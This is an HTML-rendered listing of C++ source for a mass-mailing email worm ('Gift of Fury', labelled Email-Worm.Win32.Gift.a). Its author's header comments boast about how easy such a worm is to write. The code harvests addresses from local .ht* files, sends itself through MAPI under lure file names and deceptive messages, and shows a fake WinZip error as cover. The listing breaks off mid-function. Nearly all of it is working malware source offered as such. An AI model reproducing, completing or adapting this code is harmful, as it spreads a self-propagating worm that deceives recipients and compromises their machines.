<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Email-Worm.Win32.Gift.a - GIFT.CPP.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc7 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
.sc19 {
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">/*
    Gift of Fury by Bumblebee/29a

    Disclaimer

      This is the source code of a I-WORM. The author is not responsabile
      of the damages that may occur due to the compilation and linkage of
        this file. Use it at your own risk.

    Introduction

      How easy can be to code a i-worm using MAPI! This is a little example
      of such a worm coded in C++.

      It has 2 different parts: find mail addresses to send and send mail
      stuff. I know this is not the ultimate i-worm, but works and if you
      take into account the time i wasted doing this bug... hehehe.

    Description

      . run-time i-worm using MAPI32.DLL coded in C++
      . scans for mail addresses into *.ht* files in: current folder,
      windows folder and personal folder.
      . selects between 10 different messages with custom subject, message
      body and name of the attachment.
      . zip error message as stealth plus WinZip self-extractor icon.

 See I-Worm.Rundllw32 (aka Gift.b) for APV description.

                                                                          The way of the bee
*/</span><span class="sc0">

</span><span class="sc9">#include&lt;windows.h&gt;
#include&lt;mapi.h&gt;
#include&lt;memory.h&gt;
</span><span class="sc0">
</span><span class="sc9">#pragma argsused
</span><span class="sc0">
</span><span class="sc1">/* find, get n' send mail */</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">findMail</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*);</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">GetMail</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*);</span><span class="sc0">

</span><span class="sc2">// the function we are going to use to send mails
</span><span class="sc11">ULONG</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PASCAL</span><span class="sc0"> </span><span class="sc11">FAR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">MSendMail</span><span class="sc10">)(</span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MapiMessage</span><span class="sc10">*,</span><span class="sc0"> </span><span class="sc11">FLAGS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc2">// we want it global
</span><span class="sc11">MapiMessage</span><span class="sc0"> </span><span class="sc11">mes</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">MapiRecipDesc</span><span class="sc0"> </span><span class="sc11">from</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">fileName</span><span class="sc10">[</span><span class="sc4">512</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">short</span><span class="sc0"> </span><span class="sc11">count</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">fileNames</span><span class="sc10">[]={</span><span class="sc0"> </span><span class="sc6">"Docs.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Roms.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Sex.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Setup.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Source.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"_SetupB.exe"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Pack.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"LUPdate.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Patch.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"CrkList.exe"</span><span class="sc0"> </span><span class="sc10">};</span><span class="sc0">

</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">subs</span><span class="sc10">[]={</span><span class="sc0"> </span><span class="sc6">"Documents"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Roms"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Pr0n!"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Evaluation copy"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Help"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Beta"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Do not release"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Last Update"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"The patch"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Cracks!"</span><span class="sc0"> </span><span class="sc10">};</span><span class="sc0">

</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">texts</span><span class="sc10">[]=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc6">"Send me your comments..."</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Test this ROM! IT ROCKS!."</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Adult content!!! Use with parental advisory."</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Test it 30 days for free."</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"I'm going crazy... please try to find the bug!"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Send reply if you want to be official beta tester."</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"This is the pack ;)"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"This is the last cumulative update."</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"I think all will work fine."</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Check our list and mail your requests!"</span><span class="sc0"> </span><span class="sc10">};</span><span class="sc0">

</span><span class="sc2">// our lovely func
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">SendMail</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">subject</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">sfrom</span><span class="sc10">,</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">sto</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">smes</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc2">// stealth
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">fastOut</span><span class="sc10">();</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">PASCAL</span><span class="sc0">
</span><span class="sc11">WinMain</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">HINSTANCE</span><span class="sc0"> </span><span class="sc11">hInstance</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">HINSTANCE</span><span class="sc0"> </span><span class="sc11">hPrevInstance</span><span class="sc10">,</span><span class="sc0">
                                                            </span><span class="sc11">LPSTR</span><span class="sc0"> </span><span class="sc11">lpCmdLine</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">nCmdShow</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">HINSTANCE</span><span class="sc0"> </span><span class="sc11">MAPIlHnd</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">buff</span><span class="sc10">[</span><span class="sc4">128</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">buffs</span><span class="sc10">=</span><span class="sc4">128</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">HKEY</span><span class="sc0"> </span><span class="sc11">keyHnd</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">keyPath</span><span class="sc10">[]=</span><span class="sc6">"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders"</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">keyItem</span><span class="sc10">[]=</span><span class="sc6">"Personal"</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc1">/* random number */</span><span class="sc0">
    </span><span class="sc11">count</span><span class="sc10">=(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">short</span><span class="sc10">)</span><span class="sc11">GetTickCount</span><span class="sc10">();</span><span class="sc0">
    </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">count</span><span class="sc10">&gt;</span><span class="sc4">9</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc11">count</span><span class="sc10">=(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">short</span><span class="sc10">)(</span><span class="sc11">count</span><span class="sc10">/</span><span class="sc4">2</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc1">/* get module name for the attachment */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">GetModuleFileName</span><span class="sc10">(</span><span class="sc11">hInstance</span><span class="sc10">,</span><span class="sc11">fileName</span><span class="sc10">,</span><span class="sc4">512</span><span class="sc10">))</span><span class="sc0">
        </span><span class="sc11">fastOut</span><span class="sc10">();</span><span class="sc0">

    </span><span class="sc1">/* test if MAPI32 is avaliable */</span><span class="sc0">
    </span><span class="sc11">MAPIlHnd</span><span class="sc10">=</span><span class="sc11">LoadLibraryA</span><span class="sc10">(</span><span class="sc6">"MAPI32.DLL"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">MAPIlHnd</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc11">fastOut</span><span class="sc10">();</span><span class="sc0">

    </span><span class="sc1">/* get MAPISendMail */</span><span class="sc0">
    </span><span class="sc10">(</span><span class="sc11">FARPROC</span><span class="sc0"> </span><span class="sc10">&amp;)</span><span class="sc11">MSendMail</span><span class="sc10">=</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">MAPIlHnd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MAPISendMail"</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">MSendMail</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc11">fastOut</span><span class="sc10">();</span><span class="sc0">

    </span><span class="sc11">findMail</span><span class="sc10">(</span><span class="sc6">"."</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">findMail</span><span class="sc10">(</span><span class="sc6">"\\windows"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">RegOpenKeyEx</span><span class="sc10">((</span><span class="sc11">PHKEY</span><span class="sc10">)</span><span class="sc4">0x80000001</span><span class="sc10">,</span><span class="sc11">keyPath</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">KEY_READ</span><span class="sc10">,&amp;</span><span class="sc11">keyHnd</span><span class="sc10">)==</span><span class="sc11">ERROR_SUCCESS</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">ERROR_SUCCESS</span><span class="sc10">==</span><span class="sc11">RegQueryValueEx</span><span class="sc10">(</span><span class="sc11">keyHnd</span><span class="sc10">,</span><span class="sc11">keyItem</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">buff</span><span class="sc10">,&amp;</span><span class="sc11">buffs</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">buff</span><span class="sc10">[</span><span class="sc11">buffs</span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">]=</span><span class="sc7">'\\'</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">buff</span><span class="sc10">[</span><span class="sc11">buffs</span><span class="sc10">]=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">findMail</span><span class="sc10">((</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">buff</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">FreeLibrary</span><span class="sc10">(</span><span class="sc11">MAPIlHnd</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">fastOut</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0">
</span><span class="sc11">fastOut</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">MessageBox</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc6">"File data corrupt:\n\n\tbad disk access or bad data transmission."</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"WinZip Self-eXtractor"</span><span class="sc10">,</span><span class="sc11">MB_OK</span><span class="sc10">|</span><span class="sc11">MB_ICONSTOP</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">exit</span><span class="sc10">(-</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc16">void</span><span class="sc0">
</span><span class="sc11">SendMail</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">subject</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">sfrom</span><span class="sc10">,</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">sto</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">smes</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">

    </span><span class="sc11">memset</span><span class="sc10">(&amp;</span><span class="sc11">mes</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">MapiMessage</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">memset</span><span class="sc10">(&amp;</span><span class="sc11">from</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">MapiRecipDesc</span><span class="sc10">));</span><span class="sc0">

    </span><span class="sc11">from</span><span class="sc10">.</span><span class="sc11">lpszName</span><span class="sc10">=</span><span class="sc11">sfrom</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc2">// From
</span><span class="sc0">    </span><span class="sc11">from</span><span class="sc10">.</span><span class="sc11">ulRecipClass</span><span class="sc10">=</span><span class="sc11">MAPI_ORIG</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpszSubject</span><span class="sc10">=</span><span class="sc11">subject</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc2">// Subject
</span><span class="sc0">    </span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpRecips</span><span class="sc10">=(</span><span class="sc11">MapiRecipDesc</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">malloc</span><span class="sc10">(</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">MapiRecipDesc</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpRecips</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc11">fastOut</span><span class="sc10">();</span><span class="sc0">
    </span><span class="sc11">memset</span><span class="sc10">(</span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpRecips</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">MapiRecipDesc</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpRecips</span><span class="sc10">-&gt;</span><span class="sc11">lpszName</span><span class="sc10">=</span><span class="sc11">sto</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc2">// Send to
</span><span class="sc0">    </span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpRecips</span><span class="sc10">-&gt;</span><span class="sc11">ulRecipClass</span><span class="sc10">=</span><span class="sc11">MAPI_TO</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">nRecipCount</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpFiles</span><span class="sc10">=(</span><span class="sc11">MapiFileDesc</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">malloc</span><span class="sc10">(</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">MapiFileDesc</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpFiles</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc11">fastOut</span><span class="sc10">();</span><span class="sc0">
    </span><span class="sc11">memset</span><span class="sc10">(</span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpFiles</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">MapiFileDesc</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpFiles</span><span class="sc10">-&gt;</span><span class="sc11">lpszPathName</span><span class="sc10">=</span><span class="sc11">fileName</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpFiles</span><span class="sc10">-&gt;</span><span class="sc11">lpszFileName</span><span class="sc10">=</span><span class="sc11">fileNames</span><span class="sc10">[</span><span class="sc11">count</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">nFileCount</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpOriginator</span><span class="sc10">=&amp;</span><span class="sc11">from</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpszNoteText</span><span class="sc10">=</span><span class="sc11">smes</span><span class="sc10">;</span><span class="sc0">          </span><span class="sc2">// Message
</span><span class="sc0">    </span><span class="sc10">(</span><span class="sc11">MSendMail</span><span class="sc10">)(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">mes</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAPI_LOGON_UI</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">free</span><span class="sc10">(</span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpRecips</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">free</span><span class="sc10">(</span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpFiles</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0">
</span><span class="sc11">findMail</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">wild</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">fh</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc11">fdata</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">mail</span><span class="sc10">[</span><span class="sc4">128</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">buff</span><span class="sc10">[</span><span class="sc4">512</span><span class="sc10">];</span><span class="sc0">

    </span><span class="sc11">wsprintf</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc6">"%s\\*.ht*"</span><span class="sc10">,</span><span class="sc11">wild</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">fh</span><span class="sc10">=</span><span class="sc11">FindFirstFile</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,&amp;</span><span class="sc11">fdata</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">fh</span><span class="sc10">==</span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">                           

    </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">wsprintf</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc6">"%s\\%s"</span><span class="sc10">,</span><span class="sc11">wild</span><span class="sc10">,</span><span class="sc11">fdata</span><span class="sc10">.</span><span class="sc11">cFileName</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">GetMail</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc11">mail</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">mail</span><span class="sc10">)&gt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">SendMail</span><span class="sc10">(</span><span class="sc11">subs</span><span class="sc10">[</span><span class="sc11">count</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc6">"GiftOfFury@Bumblebee.net"</span><span class="sc10">,</span><span class="sc11">mail</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">texts</span><span class="sc10">[</span><span class="sc11">count</span><span class="sc10">]);</span><span class="sc0">
            </span><span class="sc11">count</span><span class="sc10">++;</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">count</span><span class="sc10">==</span><span class="sc4">10</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc11">count</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">FindNextFile</span><span class="sc10">(</span><span class="sc11">fh</span><span class="sc10">,&amp;</span><span class="sc11">fdata</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">FindClose</span><span class="sc10">(</span><span class="sc11">fh</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0">
</span><span class="sc11">GetMail</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc19">name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">mail</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc11">fd2</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">mapped</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc19">size</span><span class="sc10">,</span><span class="sc11">i</span><span class="sc10">,</span><span class="sc11">k</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">test</span><span class="sc10">=</span><span class="sc11">FALSE</span><span class="sc10">,</span><span class="sc11">valid</span><span class="sc10">=</span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc11">mail</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">fd</span><span class="sc10">=</span><span class="sc11">CreateFile</span><span class="sc10">(</span><span class="sc19">name</span><span class="sc10">,</span><span class="sc11">GENERIC_READ</span><span class="sc10">,</span><span class="sc11">FILE_SHARE_READ</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">OPEN_EXISTING</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc11">FILE_ATTRIBUTE_ARCHIVE</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">==</span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc19">size</span><span class="sc10">=</span><span class="sc11">GetFileSize</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc19">size</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc19">size</span><span class="sc10">&lt;</span><span class="sc4">256</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc19">size</span><span class="sc10">-=</span><span class="sc4">100</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">fd2</span><span class="sc10">=</span><span class="sc11">CreateFileMapping</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">PAGE_READONLY</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">fd2</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc11">mapped</span><span class="sc10">=(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">MapViewOfFile</span><span class="sc10">(</span><span class="sc11">fd2</span><span class="sc10">,</span><span class="sc11">FILE_MAP_READ</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">mapped</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc19">size</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">!</span><span class="sc11">test</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
